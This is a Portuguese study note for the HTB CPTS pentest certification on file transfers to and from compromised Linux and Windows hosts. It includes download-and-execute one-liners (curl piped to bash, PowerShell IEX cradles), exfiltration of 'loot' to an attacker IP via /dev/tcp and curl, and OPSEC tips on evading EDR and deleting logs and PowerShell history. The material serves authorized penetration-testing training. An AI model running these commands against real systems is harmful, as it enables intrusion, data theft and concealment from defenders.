---
tema: File Transfers
tópico: Transferência de arquivos Linux/Windows, upload, download e OPSEC
tags: [htb, cpts, file-transfer, wget, curl, netcat, certutil, powershell, smb, base64, opsec]
dificuldade: easy
---

# 📦 CPTS 07 — File Transfers

> [!info] Objetivo
> Fazer o arquivo sair de onde você está e chegar inteiro do outro lado — com as ferramentas **que já existem** naquele sistema. Cobre download/upload em Linux e Windows, servidores rápidos de servir arquivo, encoding (base64/gzip/tar/xxd) para canais que corrompem binário, e o que NÃO fazer (OPSEC).

---

## 🎯 Quando usar

| Cenário | Escolha típica |
|---------|----------------|
| Alvo Linux com wget/curl | `python3 -m http.server` no atacante |
| Alvo Windows sem curl | `IWR`, `certutil`, `bitsadmin`, `WebClient` |
| Só há PowerShell e AV ativo | `IEX` + WebClient, ou SMB |
| Nenhuma egress de rede | copiar/colar em base64 ou via canal existente |
| Arquivo grande (>100 MB) | `rsync`, SMB, ou `split` + base64 |
| Precisa subir loot para o atacante | `nc -lvnp`, SMB, `curl -T`, `/dev/tcp` |

---

## 🧰 Ferramentas

| Ferramenta | Lado | Uso |
|-----------|------|-----|
| `python3 -m http.server` | Servidor | Serve diretório em HTTP em 1 segundo |
| `wget` / `curl` | Linux | Baixar (e `curl -T` fazer upload) |
| `nc` | Ambos | Transferência crua, sem protocolo |
| `scp` / `rsync` | Ambos | Só onde há SSH |
| `certutil` / `bitsadmin` | Windows | Download nativo, LOLBins |
| `Invoke-WebRequest` / WebClient | Windows | Download via PowerShell |
| `smbserver.py` | Atacante | Compartilha diretório via SMB p/ Windows |
| `pyftpdlib` / `atftpd` | Atacante | FTP e TFTP |

---

## 🐧 Linux

### Download

| Comando | O que faz / quando usar |
|---------|------------------------|
| `wget http://<IP>:8000/arq -O /tmp/arq` | Baixa e salva com nome definido |
| `wget -q --no-check-certificate https://<URL> -O arq` | Silencioso, ignora cert ruim |
| `curl -o arq http://<IP>:8000/arq` | Baixa com `-o`; `-O` usa o nome remoto |
| `curl -s http://<IP>:8000/arq \| bash` | Executa direto do canal (cuidado) |
| `curl -u user:pass -k https://<URL> -O` | Autenticado, ignora TLS inválido |
| `scp -P 2222 arq user@<IP>:/tmp/` | Copia via SSH (porta com **P** maiúsculo) |
| `rsync -avz --progress arq user@<IP>:/tmp/` | Retomável, eficiente, ideal p/ volume |

### Servir e subir

```bash
# Atacante servindo o diretório atual em HTTP (o clássico)
python3 -m http.server 8000 --directory .
# -> alvo baixa em http://<IP>:8000/<arquivo>
```

```bash
# Upload para um servidor HTTP que aceite PUT
curl -T loot.zip http://<IP>:8080/upload/
curl --upload-file loot.zip ftp://user:pass@<IP>/loot.zip   # upload via FTP
```

### Encoding e empacotamento

```bash
# base64: transforma qualquer binário em texto seguro para canais "burros"
base64 -w 0 payload.bin > payload.b64          # -w 0 = uma linha só
base64 -d payload.b64 > payload.bin            # decodifica do outro lado
cat payload.b64 | base64 -d | bash             # decodifica e executa sem gravar

# gzip + base64: reduz e ofusca em canais de texto
gzip -c loot.txt | base64 -w 0 > loot.txt.gz.b64

# tar: empacota árvore inteira antes de transferir
tar czf loot.tgz /var/www/html                 # c=create z=gzip f=arquivo
tar xzf loot.tgz -C /tmp/                      # extrai no destino

# split: quebra arquivo grande em pedaços pequenos
split -b 10M big.tgz part_                     # gera part_aa, part_ab...
cat part_* > big.tgz                           # remonta no destino
```

```bash
# xxd: converte binário em hexdump e volta — útil quando o único canal aceita texto
xxd payload.bin > payload.hex
xxd -r payload.hex > payload.bin               # -r = reverse (hex -> binário)
```

---

## 🪟 Windows

### Download

| Comando | O que faz / quando usar |
|---------|------------------------|
| `certutil -urlcache -split -f http://<IP>/arq.exe arq.exe` | Download nativo via LOLBin |
| `bitsadmin /transfer job /download /priority normal http://<IP>/arq.exe C:\Temp\arq.exe` | Serviço BITS; legado mas às vezes único caminho |
| `IWR http://<IP>/arq -OutFile C:\Temp\arq` | Alias de `Invoke-WebRequest` no PS 5+ |
| `(New-Object Net.WebClient).DownloadFile('http://<IP>/a.exe','C:\a.exe')` | WebClient: sem gravar em disco do buffer |
| `IEX (New-Object Net.WebClient).DownloadString('http://<IP>/s.ps1')` | Baixa **e executa** em memória (fileless) |
| `Invoke-RestMethod http://<IP>/data.json` | Baixa e já desserializa JSON |
| `tftp -i <IP> GET arq.exe` | TFTP (cliente incluso no Windows) |
| `copy \\<IP>\share\arq.exe C:\Temp\` | Copia de compartilhamento SMB montado |

### Transferência via PowerShell + base64

```powershell
# Baixa o binário como bytes e grava: evita quota de COM/saída formatada
$data = (New-Object Net.WebClient).DownloadData('http://<IP>/payload.exe')
[IO.File]::WriteAllBytes('C:\Temp\payload.exe', $data)

# Encode/decode base64 em PowerShell (equivalente ao base64 -d do Linux)
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\payload.exe'))
[IO.File]::WriteAllBytes('C:\Temp\payload.exe', [Convert]::FromBase64String($b64))

# Executa um comando codificado (útil para contornar parsing/citação)
powershell -enc <BASE64_UTF16LE>
```

### SMB, FTP e TFTP

```bash
# Atacante: compartilha um diretório via SMB (impacket)
smbserver.py share /tmp/payloads -smb2support
# Windows: puxa o arquivo direto do share
copy \\<IP>\share\payload.exe C:\Temp\payload.exe

# Com autenticação (contorna políticas que bloqueiam guest)
smbserver.py share /tmp/payloads -smb2support -username user -password pass
net use \\<IP>\share /user:user pass
```

```bash
# Servidor FTP rápido no atacante (com escrita liberada para upload)
python3 -m pyftpdlib -p 21 -w
# Cliente Windows: ftp -s:script.txt  (ou psftp / curl ftp://...)

# TFTP no atacante (anônimo, sem senha — só em escopo autorizado)
sudo pacman -S --needed atftp    # o pacote atftp fornece o atftpd
sudo atftpd --daemon --port 69 /srv/tftp
```

---

## 📡 Recebendo com Netcat e `/dev/tcp`

```bash
# Atacante ENVIA -> vítima RECEBE
# Vitima (Linux):
nc -lvnp 8000 > recebido.bin
# Atacante:
nc -w 3 <IP> 8000 < arquivo.bin      # -w 3 fecha após EOF (GNU netcat)
```

```bash
# Vítima ENVIA (exfil) -> atacante RECEBE
# Atacante:
nc -lvnp 8000 > loot.tgz
# Vitima, sem netcat, usando bash:
cat loot.tgz > /dev/tcp/<IP>/8000
# Porta de saída bloqueada? Teste com -z antes de perder tempo:
timeout 3 bash -c 'cat < /dev/null > /dev/tcp/<IP>/8000' && echo "egress OK"
```

**Por que `/dev/tcp` importa:** é builtin do bash — funciona sem `nc`, `curl` ou qualquer binário extra.

---

## 🔐 OPSEC e verificação

| Regra | Motivo |
|-------|--------|
| Prefira ferramentas nativas do alvo | Menos upload = menos artefato para EDR |
| Use HTTPS sempre que possível | HTTP em claro vaza payload e credencial no proxy |
| Grave em `/tmp`, `/dev/shm`, `C:\Windows\Temp`, `C:\Users\Public` | Diretórios graváveis e menos observados |
| Apague `/var/log/apache2`, histórico do PS (`ConsoleHost_history.txt`) | Higiene pós-teste dentro do escopo |
| Nunca baixe para o alvo com o **seu** domínio/IP de pesquisa pessoal | Vaza identidade |
| Verifique hash após transferir | Transferência truncada é o erro nº 1 |
| Evite `bitsadmin`/`certutil` em EDR agressivo | São LOLBins monitorados |

```bash
# Integrity check dos dois lados
sha256sum arquivo.bin                      # Linux
certutil -hashfile arquivo.bin SHA256      # Windows (cmd)
Get-FileHash arquivo.bin -Algorithm SHA256 # Windows (PowerShell)
```

---

## ⚠️ Pegadinhas

- `nc -lvnp` sem `-w`/`-N` **fica pendurado** esperando EOF; some só quando o peer fecha.
- OpenBSD `nc` não tem `-q`; use `-N` (shutdown on EOF) ao enviar.
- Binário corrompido atravessando canal de texto (web shell, telnet): **sempre base64**.
- `scp` usa `-P` (porta) e `-i` (chave); `-p` preserva atributos — trocar os dois quebra tudo.
- `python3 -m http.server` fica preso no diretório da sessão se você não passar `--directory`.
- Firewall de egress bloqueia 80/443 mas libera 53/8080/8443 — teste alternativas.
- AV coloca o payload em quarentena "no meio do download": confirme o hash, não o `HTTP 200`.
- SMB precisa de `-smb2support` para Windows 10/11 modernos.

## ✅ Checklist rápido

- [ ] Ferramenta escolhida existe no alvo? (`which`, `Get-Command`)
- [ ] Canal decide encoding: texto → base64
- [ ] Servidor de origem escutando na interface correta
- [ ] Hash conferido depois da transferência
- [ ] Bit de execução ajustado (`chmod +x`) no Linux
- [ ] Artefato em diretório gravável e depois removido
- [ ] Egress testado antes de perder tempo

## 🔗 Relacionado

- [[CPTS 08 - Shells and Payloads]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]
- [[Fase 07 - Shells e Transferência de Arquivos]]
- [[Fase 08 - Pivoting e Tunneling]]
